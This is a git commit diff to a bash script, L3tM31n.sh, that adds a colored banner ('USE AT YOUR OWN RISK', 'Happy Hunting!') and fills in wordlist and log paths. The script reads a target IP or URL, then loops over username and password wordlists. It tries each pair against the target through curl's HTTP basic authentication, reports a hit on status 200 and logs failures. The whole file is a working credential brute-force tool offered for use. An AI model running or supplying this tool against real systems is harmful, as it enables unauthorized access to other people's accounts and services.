ef47514f1585ee52fa9ad31e3cfa44b975314d03
sudo_KING <sudo-KING@users.noreply.github.com>
2017-10-03 11:46:25 -0400

    Update L3tM31n.sh

--- L3tM31n.sh
+++ L3tM31n.sh
@@ -4,16 +4,43 @@
 
 #!/bin/bash
 
+BLACK='\e[0;30m'
+BLUE='\e[0;34m'
+GREEN='\e[0;32m'
+CYAN='\e[0;36m'
+RED='\e[0;31m'
+PURPLE='\e[0;35m'
+BROWN='\e[0;33m'
+LIGHTGRAY='\e[0;37m'
+DARKGRAY='\e[1;30m'
+LIGHTBLUE='\e[1;34m'
+LIGHTGREEN='\e[1;32m'
+LIGHTCYAN='\e[1;36m'
+LIGHTRED='\e[1;31m'
+LIGHTPURPLE='\e[1;35m'
+YELLOW='\e[1;33m'
+WHITE='\e[1;37m'
+NC='\e[0m'              # No Color
+
+echo -e ""
+echo -e $RED "                        This Tool Can Lead to Legal Ramifications "
+echo -e $YELLOW  "                             USE AT YOUR OWN RISK!            "
+echo -e $GREEN  "                                 by: sudo_KING .0.             "
+echo -e $BLUE "                                   Happy Hunting!                " $NC
+echo -e ""
+
+sleep 2
+
 read -p " Input Target IP or URL and Hit Enter: " ADDRESS
 
 url=$ADDRESS
-for user in $(cat <user wordlist>); do 
-  for pass in $(cat <pass wordlist>); do
+for user in $(cat ~/Desktop/1nks/letmein/user.txt); do 
+  for pass in $(cat ~/Desktop/1nks/letmein/pass.txt); do
     http_code=$(curl -v -L -u "$user":"$pass" "$url" -w '%{http_code}' -o /dev/null -s)
     if [[ $http_code -eq 200 ]]; then
       echo "Success: Address:'$ADDRESS' User:'$user' Pass:'$pass'"
       break
-else echo  "Failed: "$user" and "$pass" on "$ADDRESS"" >> <Specify Location and Name of Out File>
+else echo  "Failed: "$user" and "$pass" on "$ADDRESS"" >> ~/Desktop/1nks/letmein/status.txt
     fi
   done
 done
